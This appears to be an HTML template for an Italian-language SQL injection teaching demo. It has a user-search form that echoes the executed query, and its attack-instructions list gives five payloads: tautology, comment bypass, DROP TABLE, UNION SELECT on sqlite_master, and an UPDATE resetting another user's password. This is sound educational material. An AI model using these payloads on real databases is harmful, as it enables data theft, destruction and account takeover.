<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Demo SQL Injection</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        input[type=text] { width: 300px; }
        pre { background: #eee; padding: 10px; }
    </style>
</head>
<body>
    <h1>Demo SQL Injection</h1>
    <form method="post">
        <label for="username">Cerca utente (username):</label>
        <input type="text" id="username" name="username" autocomplete="off">
        <button type="submit">Cerca</button>
    </form>
    {% if query %}
        <h3>Query eseguita:</h3>
        <pre>{{ query }}</pre>
    {% endif %}
    {% if result %}
        <h3>Risultato:</h3>
        <pre>{{ result }}</pre>
    {% endif %}
    <hr>
    <h2>Istruzioni per l'attacco</h2>
    <ul>
        <li><b>Tautologia:</b> Inserisci <code>' OR 1=1 --</code> per vedere tutti gli utenti</li>
        <li><b>Commento:</b> Inserisci <code>alice' --</code> per ignorare la password</li>
        <li><b>Piggybacked:</b> Inserisci <code>alice'; DROP TABLE users; --</code> per cancellare la tabella</li>
        <li><b>Esfiltrazione:</b> Prova <code>' UNION SELECT 1, name, sql FROM sqlite_master --</code> per vedere la struttura del DB</li>
        <li><b>Modifica:</b> <code>alice'; UPDATE users SET password='hacked' WHERE username='bob'; --</code></li>
    </ul>
</body>
</html> 